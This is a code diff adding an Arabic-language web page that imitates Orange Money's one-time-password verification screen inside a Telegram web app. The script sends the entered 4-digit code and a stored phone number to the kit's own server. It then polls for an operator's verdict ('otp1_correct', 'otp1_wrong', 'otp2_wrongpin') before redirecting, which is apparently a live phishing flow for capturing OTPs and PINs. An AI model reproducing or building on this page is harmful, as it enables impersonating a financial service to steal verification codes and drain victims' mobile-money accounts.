@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>التحقق من الرمز - أورانج موني</title>
+    
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --orange-primary: #f16e00;
+            --bg-color: #f7f7f7;
+            --card-bg: #ffffff;
+            --text-dark: #111111;
+            --text-muted: #666666;
+            --border-orange: #f16e00;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 15px;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .card {
+            background: var(--card-bg);
+            width: 100%;
+            max-width: 420px;
+            padding: 30px 20px;
+            border-radius: 20px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
+            text-align: center;
+        }
+
+        .header-logo {
+            font-size: 24px;
+            font-weight: 900;
+            color: var(--orange-primary);
+            margin-bottom: 6px;
+        }
+
+        h2 {
+            margin: 0 0 10px 0;
+            font-size: 22px;
+            color: var(--text-dark);
+            font-weight: 800;
+        }
+
+        .instruction {
+            font-size: 14px;
+            color: var(--text-muted);
+            margin: 0 0 24px 0;
+            line-height: 1.4;
+        }
+
+        /* 4-Digit Number-Only OTP Input Grid - Scaled to fit perfectly */
+        .code-input-container {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 24px;
+            direction: ltr;
+        }
+
+        .code-box {
+            width: 44px;
+            height: 52px;
+            border: 2px solid var(--border-orange);
+            border-radius: 10px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: 800;
+            outline: none;
+            color: var(--text-dark);
+            background-color: #ffffff;
+        }
+
+        .code-box:focus {
+            box-shadow: 0 0 6px rgba(241, 110, 0, 0.4);
+            border-width: 2.5px;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background-color: #e0e0e0;
+            color: #999999;
+            border: none;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 800;
+            cursor: not-allowed;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            transition: background-color 0.2s;
+        }
+
+        .submit-btn.active {
+            background-color: var(--orange-primary);
+            color: white;
+            cursor: pointer;
+        }
+
+        .submit-btn.active:hover {
+            background-color: #d66100;
+        }
+
+        .error-message {
+            color: #e74c3c;
+            font-size: 13px;
+            margin-bottom: 15px;
+            display: none;
+            font-weight: 600;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="card">
+    <div class="header-logo">Orange Money</div>
+    <h2>رمز التحقق (OTP)</h2>
+
+    <p class="instruction">
+        الرجاء إدخال رمز التحقق المكون من 4 أرقام المرسل إلى هاتفك المحمول.
+    </p>
+
+    <div id="errorText" class="error-message">رمز التحقق غير صحيح أو انتهت صلاحيته. يرجى المحاولة مرة أخرى.</div>
+
+    <!-- 4-digit number-only boxes -->
+    <div class="code-input-container">
+        <input type="tel" maxlength="1" class="code-box" inputmode="numeric" autocomplete="off">
+        <input type="tel" maxlength="1" class="code-box" inputmode="numeric" autocomplete="off">
+        <input type="tel" maxlength="1" class="code-box" inputmode="numeric" autocomplete="off">
+        <input type="tel" maxlength="1" class="code-box" inputmode="numeric" autocomplete="off">
+    </div>
+
+    <button id="submitBtn" class="submit-btn" disabled>تحقق من الرمز</button>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+    const codeBoxes = document.querySelectorAll('.code-box');
+    const submitBtn = document.getElementById('submitBtn');
+    const errorText = document.getElementById('errorText');
+    const savedPhone = localStorage.getItem('phone');
+
+    codeBoxes.forEach((box, index) => {
+        box.addEventListener('input', (e) => {
+            box.value = box.value.replace(/\D/g, '');
+
+            if (box.value && index < codeBoxes.length - 1) {
+                codeBoxes[index + 1].focus();
+            }
+
+            checkInputs();
+        });
+
+        box.addEventListener('keydown', (e) => {
+            if (e.key === "Backspace" && !box.value && index > 0) {
+                codeBoxes[index - 1].focus();
+            }
+        });
+
+        box.addEventListener('paste', (e) => {
+            e.preventDefault();
+            const pasteData = (e.clipboardData || window.clipboardData)
+                .getData('text')
+                .replace(/\D/g, '');
+
+            if (pasteData.length > 0) {
+                codeBoxes.forEach((b, i) => {
+                    b.value = pasteData[i] || '';
+                });
+                const focusIndex = Math.min(pasteData.length, codeBoxes.length - 1);
+                codeBoxes[focusIndex].focus();
+            }
+            checkInputs();
+        });
+    });
+
+    function checkInputs() {
+        const fullCode = Array.from(codeBoxes).map(b => b.value).join('');
+        const isComplete = fullCode.length === 4;
+        submitBtn.disabled = !isComplete;
+        submitBtn.classList.toggle('active', isComplete);
+        errorText.style.display = 'none';
+    }
+
+    submitBtn.addEventListener('click', async () => {
+        if (submitBtn.disabled) return;
+
+        const codeValue = Array.from(codeBoxes).map(b => b.value).join('');
+        if (codeValue.length < 4) return;
+
+        try {
+            const res = await fetch('/api/verify-first-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: savedPhone, code: codeValue })
+            });
+
+            const data = await res.json();
+            if (data.success) {
+                const interval = setInterval(async () => {
+                    const statusRes = await fetch(`/api/check-status?phone=${savedPhone}`);
+                    const statusData = await statusRes.json();
+
+                    if (statusData.status === "otp1_correct") {
+                        clearInterval(interval);
+                        window.location.href = "/page9";
+                    } 
+                    else if (statusData.status === "otp1_wrong") {
+                        clearInterval(interval);
+                        errorText.style.display = "block";
+                        codeBoxes.forEach(b => b.value = "");
+                        codeBoxes[0].focus();
+                        checkInputs();
+                    } 
+                    else if (statusData.status === "otp2_wrongpin") {
+                        clearInterval(interval);
+                        window.location.href = "/page6?error=wrongpin";
+                    }
+                }, 2000);
+            }
+        } catch (e) {
+            console.error("Error submitting OTP:", e);
+        }
+    });
+
+    if (window.Telegram?.WebApp) {
+        window.Telegram.WebApp.ready();
+        window.Telegram.WebApp.expand();
+    }
+});
+</script>
+
+</body>
+</html>
